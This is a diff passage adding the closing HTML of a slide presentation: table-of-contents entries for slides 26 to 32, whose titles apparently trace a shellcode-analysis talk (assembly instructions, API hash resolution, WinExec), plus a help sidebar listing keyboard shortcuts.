+      <tr id="toc-row-26">
+        <th><a href="#slide26">mov     cx, [ebx+ecx*2]</a></th>
+        <td><a href="#slide26">26</a></td>
+      </tr>
+      
+      
+      <tr id="toc-row-27">
+        <th><a href="#slide27">mov     ebx, [edx+1Ch]</a></th>
+        <td><a href="#slide27">27</a></td>
+      </tr>
+      
+      
+      <tr id="toc-row-28">
+        <th><a href="#slide28">Hash now resolved!</a></th>
+        <td><a href="#slide28">28</a></td>
+      </tr>
+      
+      
+      <tr id="toc-row-29">
+        <th><a href="#slide29">Winexec</a></th>
+        <td><a href="#slide29">29</a></td>
+      </tr>
+      
+      
+      <tr id="toc-row-30">
+        <th><a href="#slide30">73E2D87Eh Hash</a></th>
+        <td><a href="#slide30">30</a></td>
+      </tr>
+      
+      
+      <tr id="toc-row-31">
+        <th><a href="#slide31">Lastly</a></th>
+        <td><a href="#slide31">31</a></td>
+      </tr>
+      
+      
+      <tr id="toc-row-32">
+        <th><a href="#slide32">EOF</a></th>
+        <td><a href="#slide32">32</a></td>
+      </tr>
+      
+      
+    </table>
+  </div>
+  
+  <div id="help" class="sidebar hidden">
+    <h2>Help</h2>
+    <table>
+      <caption>Help</caption>
+      <tr>
+        <th>Table of Contents</th>
+        <td>t</td>
+      </tr>
+      <tr>
+        <th>Exposé</th>
+        <td>ESC</td>
+      </tr>
+      <tr>
+        <th>Full screen slides</th>
+        <td>e</td>
+      </tr>
+      <tr>
+        <th>Presenter View</th>
+        <td>p</td>
+      </tr>
+      <tr>
+        <th>Source Files</th>
+        <td>s</td>
+      </tr>
+      <tr>
+        <th>Slide Numbers</th>
+        <td>n</td>
+      </tr>
+      <tr>
+        <th>Toggle screen blanking</th>
+        <td>b</td>
+      </tr>
+      <tr>
+        <th>Show/hide slide context</th>
+        <td>c</td>
+      </tr>
+      <tr>
+        <th>Notes</th>
+        <td>2</td>
+      </tr>
+      <tr>
+        <th>Help</th>
+        <td>h</td>
+      </tr>
+    </table>
+  </div>
+  <script>main()</script>
+</body>
+</html>
